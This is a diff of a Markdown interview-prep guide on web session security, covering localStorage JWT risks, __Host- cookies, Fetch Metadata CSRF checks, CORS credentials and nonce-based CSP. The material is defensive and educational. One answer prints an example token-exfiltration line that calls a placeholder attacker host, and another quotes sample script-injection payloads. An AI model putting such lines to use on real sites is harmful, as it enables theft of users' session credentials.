@@ -246,34 +246,29 @@ flowchart LR
 
 ---
 
-## 9. Interview Drill: Web Security & Session Architecture
+## Interview Drill
 
-<details>
-<summary>1. A frontend developer insists: "We don't need cookies or CSRF protection because we store our JWTs in `localStorage` and send them via `Authorization: Bearer` headers." What are the critical trade-offs and vulnerabilities of this decision?</summary>
+<details><summary>1. A frontend developer insists: "We don't need cookies or CSRF protection because we store our JWTs in `localStorage` and send them via `Authorization: Bearer` headers." What are the critical trade-offs and vulnerabilities of this decision?</summary>
 
 Storing tokens in `localStorage` eliminates traditional CSRF attacks (because browsers do not attach `localStorage` automatically across origins). However, it introduces a vastly more dangerous vulnerability: **Trivial XSS Token Exfiltration**. Any JavaScript executing on the origin (via an injection vulnerability, compromised npm dependency, or malicious third-party script) has unrestricted access to `localStorage`. An attacker executes: `fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'))` and permanently captures the user's credentials. Furthermore, `localStorage` provides zero scoping mechanisms: it ignores the `Secure` flag (accessible over plaintext HTTP if mixed content occurs) and cannot be marked `HttpOnly`. The modern architecture is the **Backend-For-Frontend (BFF)** pattern, keeping tokens in server-side storage and using `__Host-HttpOnly` cookies.
 </details>
 
-<details>
-<summary>2. Why does the `__Host-` cookie prefix require omitting the `Domain` attribute, and what attack does this prevent?</summary>
+<details><summary>2. Why does the `__Host-` cookie prefix require omitting the `Domain` attribute, and what attack does this prevent?</summary>
 
 When a cookie specifies a `Domain` attribute (e.g. `Set-Cookie: name=val; Domain=example.com`), the cookie is automatically inherited by all subdomains (`foo.example.com`, `bar.example.com`). Furthermore, RFC 6265 allows sibling subdomains to set cookies for the parent domain. In a **Cookie Tossing Attack**, an attacker who compromises a lower-security sibling subdomain (`user-blog.example.com`) injects a forged cookie for `example.com`. When the user navigates to the secure banking app (`bank.example.com`), the browser sends both cookies, creating session confusion. Omitting the `Domain` attribute instructs the browser to pin the cookie **strictly and exclusively to the exact hostname that set it**. Combined with the `Secure` flag and `Path=/`, the `__Host-` prefix guarantees that no parent or sibling subdomain can overwrite or shadow the session cookie.
 </details>
 
-<details>
-<summary>3. Explain how Fetch Metadata headers (`Sec-Fetch-Site`) allow an API server to prevent CSRF without managing per-session synchronizer tokens.</summary>
+<details><summary>3. Explain how Fetch Metadata headers (`Sec-Fetch-Site`) allow an API server to prevent CSRF without managing per-session synchronizer tokens.</summary>
 
 Fetch Metadata headers are generated directly by the browser's network stack and cannot be overridden by JavaScript or malicious forms. For any outgoing HTTP request, the browser includes `Sec-Fetch-Site: same-origin`, `same-site`, or `cross-site`. When receiving a state-changing API request (`POST`, `PUT`, `DELETE`), the server simply inspects `req.headers['sec-fetch-site']`. If the value is `cross-site`, the server knows with 100% cryptographic browser certainty that the request was triggered by an external website (such as `evil.com`), and instantly rejects the request with HTTP 403 Forbidden. This eliminates the operational overhead of generating and validating synchronizer tokens for API endpoints.
 </details>
 
-<details>
-<summary>4. Why does configuring `Access-Control-Allow-Origin: *` fail to work when client requests include `credentials: "include"`?</summary>
+<details><summary>4. Why does configuring `Access-Control-Allow-Origin: *` fail to work when client requests include `credentials: "include"`?</summary>
 
 The W3C CORS specification explicitly forbids the wildcard `*` from being used when credentials (cookies, HTTP authentication, or client TLS certificates) are enabled. If the browser allowed `Access-Control-Allow-Origin: *` with credentials, any malicious website on the internet could issue an asynchronous `fetch('https://bank.com/account', { credentials: 'include' })` and read the user's private financial records. When credentials are included, the server must explicitly respond with a specific, validated origin: `Access-Control-Allow-Origin: https://trusted.example.com` `Access-Control-Allow-Credentials: true` If the server returns `*`, the browser halts and throws a CORS security error without exposing the response data.
 </details>
 
-<details>
-<summary>5. What is the difference between a Nonce-based Content Security Policy and a Domain-based Allowlist, and why is the domain allowlist considered obsolete?</summary>
+<details><summary>5. What is the difference between a Nonce-based Content Security Policy and a Domain-based Allowlist, and why is the domain allowlist considered obsolete?</summary>
 
 - **Domain Allowlist** (`script-src 'self' cdn.example.com`): Authorizes scripts based on the domain from which they are loaded. It is obsolete because attackers easily bypass it using "script gadgets" on the allowed domain (e.g. an outdated Angular/jQuery library on the CDN, or an open JSONP callback endpoint that reflects user input).
 - **Nonce-based CSP** (`script-src 'nonce-random' 'strict-dynamic'`): Authorizes scripts based on a per-request cryptographically random nonce generated by the server. Even if an attacker injects `<script src="https://cdn.example.com/exploit.js">` or inline `<script>alert(1)</script>`, the browser refuses to execute it because the attacker cannot guess the secret 128-bit nonce generated for that specific HTTP response.
